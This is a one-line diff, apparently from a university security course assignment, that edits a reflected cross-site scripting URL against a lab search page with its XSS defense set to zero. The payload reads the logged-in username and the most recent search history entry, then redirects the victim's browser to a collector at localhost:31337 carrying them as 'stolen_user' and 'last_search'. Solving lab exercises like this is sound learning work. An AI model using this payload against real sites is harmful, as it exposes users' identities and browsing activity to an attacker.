@@ -1,1 +1,1 @@
-https://project2.ecen4133.org/search?xssdefense=0&q=<script>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='%2B$("%23logged-in-user").text()%2B'	%26last_search='%2B$("%23history-list").children()[1].innerHTML})</script>
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='%2B$("%23logged-in-user").text()%2B'%26last_search='%2B$("%23history-list").children()[1].innerHTML})</script>
